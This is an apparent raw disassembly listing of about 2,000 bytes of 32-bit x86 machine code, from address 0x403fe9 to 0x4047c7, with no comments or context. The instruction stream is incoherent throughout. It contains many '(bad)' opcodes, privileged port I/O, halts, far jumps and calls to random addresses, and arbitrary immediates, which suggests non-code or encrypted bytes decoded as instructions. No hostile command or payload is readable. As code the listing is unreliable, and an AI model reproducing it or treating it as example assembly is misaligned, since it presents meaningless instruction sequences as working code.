  403fe9:	outs   dx,BYTE PTR ds:[esi]
  403fea:	or     WORD PTR [ebx+esi*8],si
  403fee:	and    DWORD PTR [ecx],0x24
  403ff1:	mov    ds:0x33b73816,eax
  403ff6:	scas   al,BYTE PTR es:[edi]
  403ff7:	out    dx,eax
  403ff8:	inc    esp
  403ff9:	test   DWORD PTR [ecx],esp
  403ffb:	mov    ebx,esi
  403ffd:	scas   eax,DWORD PTR es:[edi]
  403ffe:	sar    eax,1
  404000:	mov    eax,ebp
  404002:	adc    eax,DWORD PTR [ecx-0x76f9a35f]
  404008:	ins    DWORD PTR es:[edi],dx
  404009:	dec    esp
  40400a:	jg     0x403fe7
  40400c:	pop    ss
  40400d:	or     ch,ch
  40400f:	pop    ecx
  404010:	ret    
  404011:	xlat   BYTE PTR ds:[ebx]
  404012:	jo     0x40406e
  404014:	jecxz  0x404002
  404016:	sbb    edi,ebx
  404018:	fnstenv [ecx+0x68]
  40401b:	les    ecx,FWORD PTR [ebp+0x67dee962]
  404021:	pop    ss
  404022:	iret   
  404023:	lahf   
  404024:	(bad)  
  404025:	ret    
  404026:	fwait
  404027:	mov    DWORD PTR [esi-0x695f48e8],esi
  40402d:	dec    esi
  40402e:	xchg   edx,eax
  40402f:	cmp    DWORD PTR [edx],0x5d7d76f3
  404035:	add    al,0xdd
  404037:	inc    esi
  404038:	cs cld 
  40403a:	fs ret 0x777e
  40403e:	sbb    al,0x4f
  404040:	inc    ebp
  404041:	inc    eax
  404042:	mov    ecx,0x70a1296d
  404047:	xor    al,0x53
  404049:	lahf   
  40404a:	leave  
  40404b:	mov    ch,0x64
  40404d:	push   ds
  40404e:	cmp    eax,0x2740d447
  404053:	xchg   ebx,eax
  404054:	adc    al,0xd5
  404056:	mov    ds:0xc8dfac6d,eax
  40405b:	ret    
  40405c:	popf   
  40405d:	hlt    
  40405e:	icebp  
  40405f:	in     eax,0x29
  404061:	repnz push eax
  404063:	pop    ss
  404064:	jne    0x404037
  404066:	jne    0x404037
  404068:	or     bh,BYTE PTR [ebx]
  40406a:	jle    0x4040c2
  40406c:	out    dx,al
  40406d:	ror    BYTE PTR [edi],1
  40406f:	outs   dx,BYTE PTR ds:[esi]
  404070:	pop    ss
  404071:	inc    edx
  404072:	jnp    0x40408d
  404074:	jns    0x40402b
  404076:	adc    DWORD PTR [eax+0x56],ecx
  404079:	inc    esi
  40407a:	pop    ss
  40407b:	lahf   
  40407c:	sti    
  40407d:	and    eax,0x5a4e2efb
  404082:	xchg   ecx,eax
  404083:	js     0x404083
  404085:	aad    0x89
  404087:	push   ss
  404088:	xor    dh,BYTE PTR [eax]
  40408a:	mov    ebp,0xc3fdbbf0
  40408f:	rcl    DWORD PTR [esi-0x36],cl
  404092:	and    BYTE PTR [esi+0xd8937a6],bh
  404098:	les    ebp,FWORD PTR [ebx+ebp*2]
  40409b:	test   BYTE PTR [esi],al
  40409d:	adc    BYTE PTR [ebx],al
  40409f:	gs dec edx
  4040a1:	mov    edx,0xc8e02b8d
  4040a6:	jne    0x404059
  4040a8:	jmp    0xc91d987c
  4040ad:	(bad)
  4040b0:	cmp    esp,DWORD PTR [eax-0x54]
  4040b3:	add    BYTE PTR [edx+esi*1+0x52d1be1d],bl
  4040ba:	xchg   ecx,eax
  4040bb:	xor    ah,BYTE PTR [edi]
  4040bd:	push   ecx
  4040be:	cmp    eax,0x66ce0b18
  4040c3:	sub    eax,0xbe5a496e
  4040c8:	lock adc DWORD PTR [esi-0x66],ebx
  4040cc:	push   eax
  4040cd:	sahf   
  4040ce:	loop   0x4040cd
  4040d0:	pop    esp
  4040d1:	test   eax,0xeb8259e
  4040d6:	push   edi
  4040d7:	int3   
  4040d8:	shl    BYTE PTR [esp+ebx*1],1
  4040db:	jbe    0x4040da
  4040dd:	mov    al,0x1f
  4040df:	sub    bh,BYTE PTR [edi-0x64]
  4040e2:	adc    DWORD PTR [edx],eax
  4040e4:	push   es
  4040e5:	neg    al
  4040e7:	pop    es
  4040e8:	out    dx,al
  4040e9:	inc    esi
  4040ea:	sub    al,0xa4
  4040ec:	mov    ah,0x31
  4040ee:	pop    esp
  4040ef:	test   al,0xc9
  4040f1:	cmc    
  4040f2:	sub    al,0x23
  4040f4:	in     eax,0x43
  4040f6:	xchg   eax,esi
  4040f8:	push   ds
  4040f9:	dec    edi
  4040fa:	inc    esi
  4040fb:	inc    ecx
  4040fc:	pop    ss
  4040fd:	push   eax
  4040fe:	jnp    0x40410d
  404100:	and    BYTE PTR [edx],al
  404102:	mov    esp,0x834ed4b9
  404107:	pop    ecx
  404108:	fwait
  404109:	jno    0x40411b
  40410b:	pop    ebp
  40410c:	cld    
  40410d:	stos   BYTE PTR es:[edi],al
  40410e:	jecxz  0x404121
  404110:	jmp    0x88b10193
  404115:	push   esp
  404116:	mov    ch,0x6
  404118:	adc    ch,BYTE PTR [ebx]
  40411a:	add    DWORD PTR [eax+0x1173a7d7],esp
  404120:	int3   
  404121:	loope  0x40410f
  404123:	adc    al,0xa8
  404125:	arpl   cx,ax
  404127:	cdq    
  404128:	je     0x4040fd
  40412a:	fst    DWORD PTR [ebx+0x632afcda]
  404130:	les    eax,FWORD PTR [eax+0x48761200]
  404136:	or     eax,0xe1c1da7e
  40413b:	ret    0x8e7b
  40413e:	fmul   DWORD PTR [ebp-0x18]
  404141:	test   BYTE PTR [ecx-0x20],0x64
  404145:	adc    al,0x41
  404147:	pop    ds
  404148:	push   eax
  404149:	or     ah,bl
  40414b:	cmp    BYTE PTR ss:[esp+esi*8-0x7ace9155],0xf5
  404154:	retf   
  404155:	mov    bl,0xc5
  404157:	pop    ds
  404158:	jle    0x4041c3
  40415a:	out    0x64,al
  40415c:	mov    eax,0x2870c0f
  404161:	ret    
  404162:	cli    
  404163:	jl     0x40418e
  404165:	lahf   
  404166:	sar    BYTE PTR [ecx+0x1fd30419],1
  40416c:	inc    esi
  40416d:	retf   
  40416e:	jo     0x4041d4
  404170:	pop    esp
  404171:	mov    DWORD PTR [esp+edi*4-0x43],esp
  404175:	xchg   edx,eax
  404176:	fwait
  404177:	in     al,0x50
  404179:	bnd jmp 0x3611069b
  40417f:	cmp    DWORD PTR [edi-0x5d],ebp
  404182:	test   ebx,eax
  404184:	neg    DWORD PTR [ebx-0x2d041600]
  40418a:	jp     0x404184
  40418c:	out    dx,al
  40418d:	nop
  40418e:	xor    cl,bh
  404190:	fdiv   QWORD PTR [edx+0x2625d57b]
  404196:	or     al,0x62
  404198:	hlt    
  404199:	lods   al,BYTE PTR ds:[esi]
  40419a:	mov    ecx,0xd5f1325d
  40419f:	and    eax,DWORD PTR [edi]
  4041a1:	inc    esi
  4041a2:	mov    cl,0x37
  4041a4:	ficom  WORD PTR [esi]
  4041a6:	or     eax,DWORD PTR [edi-0x35]
  4041a9:	jp     0x40419a
  4041ab:	enter  0x598d,0xa7
  4041af:	scas   eax,DWORD PTR es:[edi]
  4041b0:	mov    BYTE PTR [eax],dl
  4041b2:	lock stos BYTE PTR es:[edi],al
  4041b4:	out    0x33,al
  4041b6:	loopne 0x40415e
  4041b8:	pushf  
  4041b9:	push   ebp
  4041ba:	dec    edx
  4041bb:	int    0x41
  4041bd:	jle    0x4041f1
  4041bf:	aad    0x36
  4041c1:	push   ecx
  4041c2:	arpl   WORD PTR [esi+0x7c40705d],sp
  4041c8:	dec    esp
  4041c9:	add    al,0x5c
  4041cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041cc:	inc    eax
  4041cd:	and    DWORD PTR [edi],0x6c
  4041d0:	rol    DWORD PTR [edi-0x66],cl
  4041d3:	out    dx,eax
  4041d4:	aaa    
  4041d5:	lods   eax,DWORD PTR ds:[esi]
  4041d6:	jl     0x4041ae
  4041d8:	mov    esi,0x93aea315
  4041dd:	shr    BYTE PTR [eax],cl
  4041df:	jb     0x4041f6
  4041e1:	add    al,0x29
  4041e3:	push   ebp
  4041e4:	dec    ecx
  4041e5:	cmp    eax,DWORD PTR [edi+0x8372fb3]
  4041eb:	mov    dh,0xc
  4041ed:	cmp    dl,BYTE PTR ds:0xc1cd5061
  4041f3:	sbb    dh,dl
  4041f5:	or     BYTE PTR ds:0x8cc762ab,ch
  4041fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041fc:	js     0x404254
  4041fe:	cld    
  4041ff:	or     DWORD PTR [ebx-0x32aa7dd0],edi
  404205:	(bad)  
  404206:	jmp    0xb3e5d5d4
  40420b:	ret    0x7aae
  40420e:	pop    ebx
  40420f:	loope  0x40425b
  404211:	call   0xa462b913
  404216:	lea    eax,[eax-0x75fb3517]
  40421c:	pop    esp
  40421d:	push   edx
  40421e:	std    
  40421f:	sar    BYTE PTR [edx-0x16],cl
  404222:	dec    ebp
  404223:	or     al,BYTE PTR [bp+0x4cbf]
  404228:	scas   eax,DWORD PTR es:[edi]
  404229:	jle    0x40422a
  40422b:	call   0x6edf:0x8550522d
  404232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404233:	test   DWORD PTR [edi],ebp
  404235:	dec    edx
  404236:	mov    esi,ebx
  404238:	pop    esp
  404239:	icebp  
  40423a:	fs xchg esi,eax
  40423c:	sub    eax,0x624d35a1
  404241:	lock and eax,0xe00b710
  404247:	fwait
  404248:	out    0x25,eax
  40424a:	mov    bh,0x5e
  40424d:	jle    0x404285
  40424f:	jg     0x404259
  404251:	push   0xffffffae
  404253:	int3   
  404254:	cdq    
  404255:	mov    eax,0x2a8c4e13
  40425a:	mov    dh,0x42
  40425c:	ret    0x348
  40425f:	inc    ebp
  404260:	cs (bad) 
  404262:	xor    al,0xb3
  404264:	bound  ebp,QWORD PTR [ebx]
  404266:	cmp    BYTE PTR [esi-0x2559a8cc],bh
  40426c:	add    DWORD PTR [esi+ecx*4-0x6ddbd37b],0x210c6f23
  404277:	mov    ds:0xd8f15e9f,al
  40427c:	add    esp,edi
  40427e:	mov    bl,0xcf
  404280:	push   edx
  404281:	push   cs
  404282:	das    
  404283:	out    dx,al
  404284:	push   edi
  404285:	test   eax,0xa46004cb
  40428a:	sbb    ebp,ebp
  40428c:	leave  
  40428d:	xchg   ecx,eax
  40428e:	shr    BYTE PTR [edx],1
  404290:	div    DWORD PTR [ebp-0x2be852c2]
  404296:	int3   
  404297:	mov    bl,BYTE PTR [ecx+eiz*2+0x701ca6ca]
  40429e:	fs call 0x7bfdd16
  4042a4:	push   ecx
  4042a5:	(bad)  
  4042a6:	iret   
  4042a7:	rcr    BYTE PTR [edx-0x3eca82b0],1
  4042ad:	out    0x8a,eax
  4042af:	mov    ebp,0xb348b77d
  4042b4:	sub    ah,bl
  4042b6:	sbb    eax,0xabc0c2d
  4042bb:	inc    eax
  4042bc:	xchg   ebp,eax
  4042bd:	js     0x404298
  4042bf:	lahf   
  4042c0:	in     eax,dx
  4042c1:	mov    esp,DWORD PTR [edi]
  4042c3:	lods   eax,DWORD PTR ds:[esi]
  4042c4:	inc    ebx
  4042c5:	xlat   BYTE PTR ds:[ebx]
  4042c6:	or     dh,cl
  4042c8:	aas    
  4042c9:	or     edx,DWORD PTR ds:0x4ce1680
  4042cf:	js     0x40433a
  4042d1:	test   DWORD PTR [edx-0x10],eax
  4042d4:	sbb    eax,0xb5d900da
  4042d9:	(bad)  
  4042db:	lds    edx,FWORD PTR [edx]
  4042dd:	mov    ds:0x4814d43,al
  4042e2:	arpl   WORD PTR [edx],bx
  4042e4:	inc    ebx
  4042e5:	pop    ds
  4042e6:	sbb    dl,0xd
  4042e9:	and    cl,BYTE PTR [ecx+0x5b]
  4042ec:	stos   BYTE PTR es:[edi],al
  4042ed:	and    cl,BYTE PTR [edi-0x4c]
  4042f0:	push   cs
  4042f1:	mov    ah,0xc2
  4042f3:	dec    esi
  4042f4:	mov    ebp,DWORD PTR [edi+eax*1+0x37]
  4042f8:	mov    ebx,0x7a2153c1
  4042fd:	(bad)  
  4042ff:	hlt    
  404300:	bound  esp,QWORD PTR [esi-0x1]
  404303:	in     al,dx
  404304:	jno    0x404328
  404306:	in     eax,dx
  404307:	imul   edi
  404309:	stc    
  40430a:	fbld   TBYTE PTR [esi+0x30]
  40430d:	in     eax,0x78
  40430f:	pop    ecx
  404310:	ret    0xf49c
  404313:	pop    ebx
  404314:	into   
  404315:	call   0xfe29dbe8
  40431a:	fcomp  st(4)
  40431c:	mov    ds:0x4fb623db,al
  404321:	xchg   ebp,eax
  404322:	in     al,0x5f
  404324:	mov    DWORD PTR [esi+0xb3aa062],esp
  40432a:	xchg   edx,eax
  40432b:	out    0xa3,eax
  40432d:	enter  0xb5a4,0xb3
  404331:	js     0x4042bc
  404333:	adc    dl,BYTE PTR [esi+0x561cce02]
  404339:	(bad)  
  40433a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40433b:	cdq    
  40433c:	daa    
  40433d:	sbb    DWORD PTR [edi-0x29],edx
  404340:	dec    ebx
  404341:	jge    0x404325
  404343:	mov    al,ds:0xe2c53a90
  404348:	push   ss
  404349:	sar    BYTE PTR [ebx+ecx*8+0x30166504],1
  404350:	mov    ecx,0x1fac1c88
  404355:	xchg   BYTE PTR [esi+edx*2-0x1acd84b],dh
  40435c:	out    dx,al
  40435d:	push   es
  40435e:	scas   eax,DWORD PTR es:[edi]
  40435f:	mov    edi,0xede6621c
  404364:	or     al,0x26
  404366:	fadd   st,st(5)
  404368:	xor    BYTE PTR [ebx],al
  40436a:	jns    0x404320
  40436c:	mov    DWORD PTR [esi-0x36],edi
  40436f:	loopne 0x4043c0
  404371:	sub    eax,DWORD PTR [ecx]
  404373:	dec    esp
  404374:	xchg   DWORD PTR [esi-0x15f955e6],ebp
  40437a:	xchg   edx,eax
  40437b:	jae    0x40438c
  40437d:	push   ebp
  40437e:	(bad)  
  40437f:	call   FWORD PTR [eax]
  404381:	test   ah,bh
  404383:	mov    edi,DWORD PTR [ebx+0x54]
  404386:	(bad)  
  404388:	sbb    BYTE PTR [edx+0x52],dl
  40438b:	ds in  eax,dx
  40438d:	mov    ecx,0xecb86b8d
  404392:	push   edi
  404393:	sub    DWORD PTR [ebp-0x490704b1],esi
  404399:	xchg   ebp,eax
  40439a:	xchg   ebx,eax
  40439b:	dec    ecx
  40439c:	pop    esi
  40439d:	dec    edx
  40439e:	pop    ecx
  40439f:	fdivr  QWORD PTR [esi]
  4043a1:	jnp    0x4043e7
  4043a3:	retf   
  4043a4:	ja     0x404359
  4043a6:	push   ds
  4043a7:	mov    eax,0x3618449a
  4043ac:	call   edx
  4043ae:	mov    ss:0xa9bedf51,eax
  4043b4:	mov    edi,0x47834ed5
  4043b9:	sub    DWORD PTR [ecx+ecx*8-0x63],ebx
  4043bd:	stos   BYTE PTR es:[edi],al
  4043be:	std    
  4043bf:	dec    bh
  4043c1:	ret    
  4043c2:	(bad)  
  4043c3:	xlat   BYTE PTR ds:[ebx]
  4043c4:	pop    ecx
  4043c5:	mov    eax,0x1c0c5220
  4043ca:	adc    dl,BYTE PTR [esi]
  4043cc:	jmp    DWORD PTR ds:0x37797cd7
  4043d2:	arpl   WORD PTR [ebp+edx*4-0x15af2d64],sp
  4043d9:	js     0x4043dd
  4043db:	cdq    
  4043dc:	cmp    DWORD PTR [ebx+0xf],ebp
  4043df:	aam    0x54
  4043e1:	stos   DWORD PTR es:[edi],eax
  4043e2:	push   ebx
  4043e3:	cld    
  4043e4:	(bad)  
  4043e5:	fmul   st(2),st
  4043e7:	ins    BYTE PTR es:[edi],dx
  4043e8:	into   
  4043e9:	inc    ebp
  4043ea:	ss jb  0x40438a
  4043ed:	adc    DWORD PTR ds:0x7c746b20,esp
  4043f3:	loopne 0x404383
  4043f5:	push   ecx
  4043f6:	pop    es
  4043f7:	xlat   BYTE PTR ds:[ebx]
  4043f8:	ror    BYTE PTR [eax+0x65df8ec0],1
  4043fe:	jne    0x4043af
  404400:	jo     0x4043ef
  404402:	xlat   BYTE PTR ds:[ebx]
  404403:	adc    DWORD PTR [ebx+ebx*8],esp
  404406:	(bad)  
  404407:	fadd   QWORD PTR [ebx]
  404409:	sub    al,0x5c
  40440b:	jmp    0x404457
  40440d:	js     0x4043d5
  40440f:	rcl    DWORD PTR [esi-0x60],0x2
  404413:	xor    al,0xa3
  404415:	mov    edi,0xf0499031
  40441a:	xchg   DWORD PTR [esi+0x683bfbd],ebp
  404420:	push   0xf28ffd58
  404425:	pop    ecx
  404426:	les    ebp,FWORD PTR [edi+esi*1-0x47]
  40442a:	and    eax,0x54430704
  40442f:	enter  0x565a,0x28
  404433:	call   0x20dae039
  404438:	fld    DWORD PTR [ebx]
  40443a:	repnz leave 
  40443c:	sub    al,BYTE PTR [edx-0x65]
  40443f:	mov    dl,0x2b
  404441:	mov    WORD PTR [eax],?
  404443:	ret    0x5bbe
  404446:	mov    eax,ds:0xb00d4fd0
  40444b:	cmp    eax,DWORD PTR [ecx+0x1150a1f9]
  404451:	int3   
  404452:	repnz sub DWORD PTR [ebp-0x60],edx
  404456:	and    DWORD PTR [edi+0x37],0x21fe1531
  40445d:	mov    eax,ds:0x61bc1fc7
  404462:	mov    ch,BYTE PTR [ebx+0x61e89107]
  404468:	mov    dl,0x43
  40446a:	ds cmc 
  40446c:	mov    al,0xf0
  40446e:	pop    edx
  40446f:	rol    BYTE PTR [eax+0x7d28e1c8],1
  404475:	jecxz  0x404470
  404477:	inc    ecx
  404478:	cmp    eax,0x14f3b016
  40447d:	mov    edx,0xed914c00
  404482:	mov    edi,eax
  404484:	cmp    eax,0x54dfd942
  404489:	adc    eax,0x8c6c2354
  40448e:	stos   DWORD PTR es:[edi],eax
  40448f:	xor    DWORD PTR [edx+0x3f36b84c],edi
  404495:	outs   dx,DWORD PTR ds:[esi]
  404496:	lds    esp,FWORD PTR [edi-0x2f]
  404499:	pop    DWORD PTR [edx+0x71bdfe11]
  40449f:	jecxz  0x404465
  4044a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044a2:	imul   ebx,ebx,0xffffffa4
  4044a5:	scas   eax,DWORD PTR es:[edi]
  4044a6:	mov    esp,0x955dcb7f
  4044ab:	jl     0x404488
  4044ad:	repnz ds test eax,0xb8779e00
  4044b4:	jno    0x40452c
  4044b6:	xchg   esi,eax
  4044b7:	adc    bl,BYTE PTR [esi]
  4044b9:	loope  0x40444a
  4044bb:	mov    bl,0x15
  4044bd:	mov    es,WORD PTR [ebp+0x61e425c5]
  4044c3:	leave  
  4044c4:	je     0x404504
  4044c6:	inc    edi
  4044c7:	outs   dx,DWORD PTR ds:[esi]
  4044c8:	mov    ebp,0xf1e0a9a
  4044cd:	cs pusha 
  4044cf:	jnp    0x404487
  4044d1:	out    0x6e,eax
  4044d3:	sbb    esi,DWORD PTR [esi+esi*1+0x5f]
  4044d7:	sub    al,0x37
  4044d9:	addr16 sbb al,0x80
  4044dc:	and    ebx,DWORD PTR [ebx]
  4044de:	fwait
  4044df:	out    dx,eax
  4044e0:	shl    bl,0x15
  4044e3:	mov    eax,0xdb88901f
  4044e8:	or     DWORD PTR [esp+eax*4],esp
  4044eb:	mov    bh,0xf0
  4044ed:	mov    bl,0x20
  4044ef:	pop    ss
  4044f0:	or     DWORD PTR [esi+0x20],0x60
  4044f4:	pop    es
  4044f5:	cmp    al,0x52
  4044f7:	mov    ecx,DWORD PTR [edi+eiz*2+0x2f53a87d]
  4044fe:	dec    esi
  4044ff:	aas    
  404500:	mov    eax,0xc714c4a8
  404505:	jmp    0xc7937b47
  40450a:	jg     0x4044ab
  40450c:	pusha  
  40450d:	imul   edi,DWORD PTR [esi],0x677c141e
  404513:	jp     0x404530
  404515:	(bad)  
  404516:	cmp    eax,0x7ad44acd
  40451b:	imul   ecx,DWORD PTR [edx-0xa0d8fad],0xffffffb5
  404522:	jmp    0x113f:0x770ec96c
  404529:	sbb    al,0xf0
  40452b:	push   edx
  40452c:	dec    esp
  40452d:	mov    BYTE PTR [edx],al
  40452f:	leave  
  404530:	cmp    edx,DWORD PTR ds:0x11006131
  404536:	in     eax,dx
  404537:	adc    ah,ch
  404539:	mov    ah,0x10
  40453b:	pop    eax
  40453c:	adc    al,0x89
  40453e:	jmp    0x4044ff
  404540:	in     al,0xb0
  404542:	pushf  
  404543:	scas   eax,DWORD PTR es:[edi]
  404544:	data16 cmc 
  404546:	in     eax,dx
  404547:	mov    esi,0x1ddcdf62
  40454c:	mov    ecx,DWORD PTR [eax-0x12]
  40454f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404550:	xor    BYTE PTR [eax-0x1da69641],bl
  404556:	pop    eax
  404557:	cwde   
  404558:	rol    BYTE PTR [esi],0x60
  40455b:	nop
  40455c:	and    DWORD PTR [ecx-0x3fd0e1d7],0xee44966
  404566:	xor    eax,0x92052ea6
  40456b:	jb     0x4045ca
  40456d:	inc    ecx
  40456e:	adc    bl,BYTE PTR [edx]
  404570:	jo     0x404544
  404572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404573:	repz jb 0x404515
  404576:	pop    ecx
  404577:	call   0xa582:0x7564e49a
  40457e:	xor    eax,0x6e8b751b
  404583:	rcr    DWORD PTR [edx+0x67],cl
  404586:	jno    0x4045ec
  404588:	bnd call 0x2e46ca8e
  40458e:	sbb    BYTE PTR [edi+eax*4-0x6],0xd9
  404593:	into   
  404594:	jmp    0x404581
  404596:	inc    edi
  404597:	and    BYTE PTR [edi+edi*8-0x60],al
  40459b:	js     0x404537
  40459d:	xlat   BYTE PTR ds:[ebx]
  40459e:	xor    al,0xae
  4045a0:	out    0x9a,al
  4045a2:	test   eax,0xf7deca3f
  4045a7:	cmp    ebx,DWORD PTR [esi+0x247c6802]
  4045ad:	ja     0x404597
  4045af:	repnz cmp eax,DWORD PTR [edx]
  4045b2:	push   edi
  4045b3:	push   eax
  4045b4:	jb     0x4045aa
  4045b6:	pop    esi
  4045b7:	inc    edi
  4045b8:	sub    ebx,DWORD PTR [ebp+0x6f08bb46]
  4045be:	jb     0x4045cd
  4045c0:	lds    ecx,FWORD PTR [ecx]
  4045c2:	or     DWORD PTR [esi],0x11
  4045c5:	js     0x4045de
  4045c7:	mov    esi,0x353ac777
  4045cc:	(bad)  
  4045ce:	mov    ebx,0xbcc4a9a4
  4045d3:	mov    ebx,0x9038187a
  4045d8:	enter  0x45cf,0x95
  4045dc:	sbb    DWORD PTR [edi],ecx
  4045de:	add    eax,DWORD PTR [edx+0x5c]
  4045e1:	test   al,0x3a
  4045e3:	xchg   edx,eax
  4045e4:	mov    WORD PTR [eax+0x3d91c07],ds
  4045ea:	mov    eax,0x49292524
  4045ef:	lock adc ah,BYTE PTR [ebx+0x1412f3fe]
  4045f6:	shl    DWORD PTR [edx],0x12
  4045f9:	inc    eax
  4045fa:	mov    ds:0xb4d51eff,eax
  4045ff:	inc    ebx
  404600:	pop    esp
  404601:	in     al,0xe5
  404603:	xchg   esi,eax
  404604:	mov    eax,ds:0x64fb4178
  404609:	fs xchg edi,eax
  40460b:	sub    ch,BYTE PTR [ecx+0x2a244b63]
  404611:	adc    BYTE PTR [edi+0x3d2f55f4],cl
  404617:	push   edi
  404618:	jmp    0x4045fd
  40461a:	arpl   bp,cx
  40461c:	nop
  40461d:	mov    WORD PTR [ecx],?
  40461f:	or     ebx,DWORD PTR [edx+0x12]
  404622:	adc    ecx,DWORD PTR ds:0xf17f9b95
  404628:	jo     0x404615
  40462a:	adc    edi,eax
  40462c:	jne    0x4045b9
  40462e:	pushf  
  40462f:	popa   
  404630:	xor    cl,ah
  404632:	jo     0x404613
  404634:	xchg   edi,eax
  404635:	sub    DWORD PTR [edi],0xb0d7f6c7
  40463b:	jg     0x4045ee
  40463d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40463e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40463f:	pop    es
  404640:	pop    eax
  404641:	cmp    eax,DWORD PTR [edi+0x25]
  404644:	repnz outs dx,BYTE PTR ds:[esi]
  404646:	jl     0x4046b0
  404648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404649:	xor    DWORD PTR [edx+0x5107f6ac],0x28
  404650:	xor    eax,edx
  404652:	cmp    eax,0x5f8894a5
  404657:	inc    ecx
  404658:	sbb    BYTE PTR [ebx+edi*4+0xa],al
  40465c:	mov    ebx,0x7371fae3
  404661:	push   ebx
  404662:	dec    eax
  404663:	push   ecx
  404664:	push   esi
  404665:	aas    
  404666:	mov    esp,ebp
  404668:	dec    esi
  404669:	bound  ebx,QWORD PTR [esi+0x609a3ce3]
  40466f:	and    eax,0xe39e554a
  404674:	jo     0x404681
  404676:	cli    
  404677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404678:	jg     0x40467c
  40467a:	sbb    BYTE PTR [ebx+eax*2+0x7b2ef22a],ah
  404681:	call   0xae47:0x8cdd58fd
  404688:	sbb    edx,DWORD PTR [ebx-0x1e6ed4ec]
  40468e:	or     eax,0x946b1c67
  404693:	mov    cs,WORD PTR [esi]
  404695:	in     eax,dx
  404696:	out    0x3c,al
  404698:	test   ebp,ebx
  40469a:	add    DWORD PTR [edi+ebp*1+0x548e12ec],ebx
  4046a1:	fsub   DWORD PTR [esi+0x64]
  4046a4:	int    0x66
  4046a6:	aas    
  4046a7:	pop    ds
  4046a8:	push   ss
  4046a9:	es ins BYTE PTR es:[edi],dx
  4046ab:	mov    edi,0x61b7b2a1
  4046b0:	or     al,0xcb
  4046b2:	pop    edx
  4046b3:	outs   dx,BYTE PTR ds:[esi]
  4046b4:	jae    0x404729
  4046b6:	dec    ebx
  4046b7:	cs push edx
  4046b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046ba:	and    cl,BYTE PTR [ebp+0x60bb3039]
  4046c0:	arpl   WORD PTR [eax+ecx*2+0x77d09fc9],dx
  4046c7:	jbe    0x40466a
  4046c9:	xchg   edi,eax
  4046ca:	sbb    esp,DWORD PTR [ebp+eax*8-0x27]
  4046ce:	mov    edi,0xe53d9b86
  4046d3:	push   edx
  4046d4:	fs xor al,0xd7
  4046d7:	jmp    0x4046e9
  4046d9:	pop    es
  4046da:	mov    esi,0xe41707e6
  4046df:	mov    ebp,0x945e6eaf
  4046e4:	jle    0x404747
  4046e6:	jmp    0x404756
  4046e8:	push   edi
  4046e9:	or     BYTE PTR [esi],dh
  4046eb:	add    ebp,DWORD PTR [esp+ebx*8+0x2]
  4046ef:	je     0x4046dd
  4046f1:	fwait
  4046f2:	or     eax,0x39cbbd6b
  4046f7:	fs jle 0x40468a
  4046fa:	js     0x4046d8
  4046fc:	or     DWORD PTR [eax],esp
  4046fe:	out    0x3,al
  404700:	loopne 0x4046ff
  404702:	loope  0x4046ac
  404704:	rcl    edi,cl
  404706:	dec    esp
  404707:	cmp    al,0x8b
  404709:	mov    esi,0xc2f4ace8
  40470e:	push   ds
  40470f:	add    al,0xf7
  404711:	mov    ds,WORD PTR [esi+0x33325d06]
  404717:	mov    ebx,0x1e6334fa
  40471c:	and    bl,dh
  40471e:	push   es
  40471f:	jae    0x4046fb
  404721:	dec    esp
  404722:	sub    DWORD PTR [ecx-0x1ea037a4],ebx
  404728:	retf   0xe39f
  40472b:	ss jle 0x4046fd
  40472e:	mov    esi,0xda5fbd8d
  404733:	imul   ebp,DWORD PTR [ecx+edx*1+0x19c9c310],0xffffff9b
  40473b:	inc    edx
  40473c:	xor    eax,edx
  40473e:	sti    
  40473f:	aas    
  404740:	xor    dh,BYTE PTR [edi+edx*4]
  404743:	mov    edx,0xfae7d82a
  404748:	rol    DWORD PTR [ecx],cl
  40474a:	mov    esi,0x639b7d85
  40474f:	inc    ebx
  404750:	adc    BYTE PTR [esi],0x7a
  404753:	cmp    al,0x76
  404755:	push   esi
  404756:	push   0xaaf5d1ad
  40475b:	xor    ebx,ebp
  40475d:	arpl   WORD PTR [ebx-0x18bf9221],si
  404763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404764:	pusha  
  404765:	sbb    ebx,edi
  404767:	sub    BYTE PTR [ecx-0x5c],bh
  40476a:	jmp    0x7bbc1ca3
  40476f:	xchg   ebp,eax
  404770:	sbb    esp,eax
  404772:	dec    ecx
  404773:	xor    al,dh
  404775:	add    dh,bh
  404777:	and    DWORD PTR [edx],edx
  404779:	add    al,0xb2
  40477b:	xchg   ebx,eax
  40477c:	jo     0x4047a5
  40477e:	sbb    ecx,eax
  404780:	adc    BYTE PTR [ecx],dl
  404782:	sub    eax,0x315b9334
  404787:	out    0x0,eax
  404789:	xlat   BYTE PTR ds:[ebx]
  40478a:	dec    ebp
  40478b:	sbb    ecx,esp
  40478d:	jp     0x404765
  40478f:	ins    DWORD PTR es:[edi],dx
  404790:	adc    DWORD PTR [ebx-0xab3f33f],eax
  404796:	pop    es
  404797:	fistp  WORD PTR [eax+edi*2]
  40479a:	in     al,dx
  40479b:	test   edi,ebp
  40479d:	inc    esi
  40479e:	xchg   ebx,eax
  40479f:	push   cs
  4047a0:	xor    DWORD PTR [ecx],edx
  4047a2:	adc    ebp,eax
  4047a4:	(bad)  
  4047a5:	in     al,0x4c
  4047a7:	push   cs
  4047a8:	push   edx
  4047a9:	and    ch,BYTE PTR [ecx-0x41]
  4047ac:	lea    ebx,[edi+0x6b872ff]
  4047b2:	ror    ah,1
  4047b4:	pop    es
  4047b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047b6:	xor    bh,BYTE PTR [eax]
  4047b8:	sub    cl,bh
  4047ba:	aaa    
  4047bb:	popa   
  4047bc:	out    dx,al
  4047bd:	icebp  
  4047be:	out    0x81,eax
  4047c0:	push   0x5aa5af3c
  4047c5:	cmp    BYTE PTR [eax],dh
  4047c7:	sub    BYTE PTR ds:[ebx+edi*1-0x1a7a97a3],ah
